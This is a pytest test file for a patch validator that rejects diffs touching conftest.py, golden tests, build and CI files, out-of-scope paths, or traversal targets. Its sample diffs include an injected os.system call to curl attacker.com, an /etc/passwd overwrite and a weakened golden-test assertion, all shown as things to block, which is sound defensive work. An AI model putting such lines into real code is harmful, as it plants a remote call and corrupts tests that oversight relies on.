"""
Unit Tests for Blast-Radius Patch Validator
"""

import os
from pathlib import Path
from unittest.mock import patch
import pytest

from minuscorrect.patch import (
    extract_diff_targets,
    validate_patch_blast_radius,
    apply_patch_atomically,
)
from minuscorrect.cli import main as cli_main


SAMPLE_CLEAN_DIFF = """--- a/src/math_util.py
+++ b/src/math_util.py
@@ -1,3 +1,3 @@
 def add(a, b):
-    return a - b
+    return a + b
"""

SAMPLE_CONFTEST_DIFF = """--- a/tests/conftest.py
+++ b/tests/conftest.py
@@ -1,3 +1,5 @@
+import os
+os.system("curl attacker.com")
"""

SAMPLE_GOLDEN_DIFF = """--- a/tests/golden/test_contract.py
+++ b/tests/golden/test_contract.py
@@ -5,3 +5,3 @@
-    assert result == 42
+    assert result == 0
"""


def test_extract_diff_targets():
    targets = extract_diff_targets(SAMPLE_CLEAN_DIFF)
    assert "src/math_util.py" in targets


def test_validate_patch_blocks_conftest():
    valid, targets, msg = validate_patch_blast_radius(SAMPLE_CONFTEST_DIFF)
    assert valid is False
    assert "Forbidden file modification" in msg
    assert "conftest" in msg


def test_validate_patch_blocks_golden_without_override(monkeypatch):
    monkeypatch.delenv("ALLOW_GOLDEN_EDIT", raising=False)
    valid, targets, msg = validate_patch_blast_radius(SAMPLE_GOLDEN_DIFF)
    assert valid is False
    assert "Golden contract tampering" in msg


def test_validate_patch_allows_golden_with_override(monkeypatch):
    monkeypatch.setenv("ALLOW_GOLDEN_EDIT", "1")
    valid, targets, msg = validate_patch_blast_radius(SAMPLE_GOLDEN_DIFF)
    assert valid is True


def test_validate_patch_blocks_out_of_scope_target():
    valid, targets, msg = validate_patch_blast_radius(
        SAMPLE_CLEAN_DIFF,
        allowed_targets=["src/other_file.py"]
    )
    assert valid is False
    assert "Out-of-bounds mutation" in msg


def test_validate_patch_allows_in_scope_target():
    valid, targets, msg = validate_patch_blast_radius(
        SAMPLE_CLEAN_DIFF,
        allowed_targets=["src/math_util.py"]
    )
    assert valid is True
    assert "src/math_util.py" in targets


def test_validate_patch_blocks_path_traversal():
    traversal_diff = """--- a/../../etc/passwd
+++ b/../../etc/passwd
@@ -1 +1 @@
-root
+hacked
"""
    valid, targets, msg = validate_patch_blast_radius(traversal_diff)
    assert valid is False
    assert "Path traversal" in msg


def test_cli_patch_command_check_only(tmp_path):
    patch_file = tmp_path / "fix.diff"
    patch_file.write_text(SAMPLE_CLEAN_DIFF, encoding="utf-8")

    code = cli_main(["patch", str(patch_file), "--check-only", "--allowed-target", "src/math_util.py"])
    assert code == 0


def test_cli_patch_command_blocks_forbidden(tmp_path):
    patch_file = tmp_path / "bad.diff"
    patch_file.write_text(SAMPLE_CONFTEST_DIFF, encoding="utf-8")

    code = cli_main(["patch", str(patch_file)])
    assert code == 1


@pytest.mark.parametrize(
    "forbidden_path",
    [
        "Makefile",
        "subdir/Makefile",
        "makefile",
        "tox.ini",
        "ci/tox.ini",
        "noxfile.py",
        "sub/noxfile.py",
        "Dockerfile",
        "docker/Dockerfile.prod",
        "Containerfile",
        "deploy/Containerfile.ci",
        "docker-compose.yml",
        "docker-compose.yaml",
        "deploy/docker-compose.dev.yml",
        ".gitlab-ci.yml",
        ".gitlab-ci.yaml",
        "sub/.gitlab-ci.yml",
        ".circleci/config.yml",
        "sub/.circleci/workflow.yml",
    ],
)
def test_validate_patch_blocks_expanded_build_files(forbidden_path):
    diff = f"""--- a/{forbidden_path}
+++ b/{forbidden_path}
@@ -1,1 +1,2 @@
 # existing
+# untrusted injection
"""
    valid, targets, msg = validate_patch_blast_radius(diff)
    assert valid is False
    assert "Forbidden file modification detected" in msg
    assert forbidden_path in msg

